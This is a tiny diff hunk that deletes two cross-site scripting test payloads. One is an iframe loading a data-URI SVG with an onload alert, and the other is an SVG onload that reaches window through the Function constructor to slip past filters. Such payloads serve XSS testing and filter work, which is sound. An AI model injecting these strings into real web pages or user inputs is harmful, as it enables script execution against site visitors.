@@ -1,2 +1,0 @@
-<iframe src="data:text/html,<svg xmlns=%22http://www.w3.org/2000/svg%22 onload=%22(alert)(1)%22>">
-<svg onload='new (Function.prototype.constructor)("return window")().alert(1)'></svg>
